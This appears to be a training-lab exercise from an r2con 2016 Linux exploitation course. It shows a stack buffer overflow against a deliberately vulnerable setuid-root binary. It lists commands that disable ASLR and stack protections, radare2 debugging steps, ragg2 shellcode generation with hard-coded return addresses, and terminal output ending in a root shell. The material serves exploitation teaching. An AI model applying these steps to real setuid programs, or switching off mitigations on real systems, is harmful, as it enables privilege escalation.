# simple

Disable mitigations and compilation steps
------------------------------------------

* Disable ASLR & PIE
	sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'  

* Compile without stack-canaries
	gcc -mpreferred-stack-boundary=2 simplebof.c -m32 -o simplebof -fno-stack-protector -z execstack

* Setuid the binary with root permissions
	sudo chown root simplebof
	sudo chmod +s simplebof


Radare2 solution
----------------

Verify disabled mitigations on the binary
	rabin2 -I simplebof | egrep "canary|nx|pic"
	pic      false
	canary   false
	nx       false

	

// debug the profile
r2 -e dbg.profile=profile.rarun2 -d simplebof     
	s sym.dummy
	af
	pdf
	db 0x080484a9             # 0x080484a9      c3             ret


// Generates shellcode  (buffer-64-bytes+ EBP + EIP)
ragg2 -b 32 -a x86 -z -p n2048 -d 68:0xffffc980 -i exec 
ragg2 -b 32 -a x86 -z -p n2048 -d 68:0xffffc9a0 -i exec 

// debug the exploit
r2 -e dbg.profile=exploit.rarun2 -d simplebof     
	s sym.dummy
	af
	pdf
	db 0x080484a9             # 0x080484a9      c3             ret	


dudu@r2-training~/r2con/2016/trainings/03-linux-xpl/exercises/simple:$ ./exploit.rarun2 
Hello r2con
The argument is: ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ

# id
uid=1000(dudu) gid=1000(dudu) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(dudu)
# whoami
root
# 


